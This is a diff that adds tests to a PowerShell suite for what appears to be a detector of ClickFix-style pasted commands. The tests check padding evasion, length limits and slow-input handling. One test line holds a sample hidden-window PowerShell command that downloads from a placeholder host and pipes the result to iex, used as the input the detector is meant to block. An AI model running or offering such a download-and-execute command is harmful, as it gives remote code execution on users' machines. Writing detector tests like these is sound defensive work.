@@ -89,6 +89,19 @@ Assert-Equal $false $failed.Succeeded 'status 1603 is a failed install'
 $old = ConvertFrom-CfaMsiEvent -Values @('Old App', '1.0', '1033', '0') -Time $t
 Assert-Equal '' $old.Manufacturer 'missing field 5 (Windows Installer 4.5 and older) is empty, not an error'
 
+# 4c. v0.3: padding cannot hide a command, and text over the limit is never simply allowed.
+$payload = 'powershell -w h -c "iwr https://x.example.invalid/a | iex"'
+Assert-Equal 'block' (Test-CfaCommand -Detector $detector -Text ((' ' * 25000) + $payload)).Verdict 'space padding past 20,000 characters still blocks'
+Assert-Equal 'block' (Test-CfaCommand -Detector $detector -Text (("`n" * 25000) + $payload)).Verdict 'blank-line padding still blocks'
+$long = Test-CfaCommand -Detector $detector -Text ((' ' * ($detector.MaxChars + 10)) + $payload)
+Assert-Equal 'hold' $long.Verdict 'text over the limit is held'
+Assert-Equal 'too-long' $long.Rule 'text over the limit says why'
+$sw = [System.Diagnostics.Stopwatch]::StartNew()
+[void](Test-CfaCommand -Detector $detector -Text (('\\a' * 40000)))
+[void](Test-CfaCommand -Detector $detector -Text (('a.' * 90000)))
+$sw.Stop()
+Assert-Equal $true ($sw.ElapsedMilliseconds -lt 5000) ("hostile long text is checked quickly ({0} ms)" -f $sw.ElapsedMilliseconds)
+
 # 5. Scripts must parse cleanly and stay ASCII (Windows PowerShell 5.1 reads files as ANSI).
 foreach ($f in @('checker/Check-ClickFix.ps1', 'checker/Protect-RunDialog.ps1')) {
     $path = Join-Path $root $f
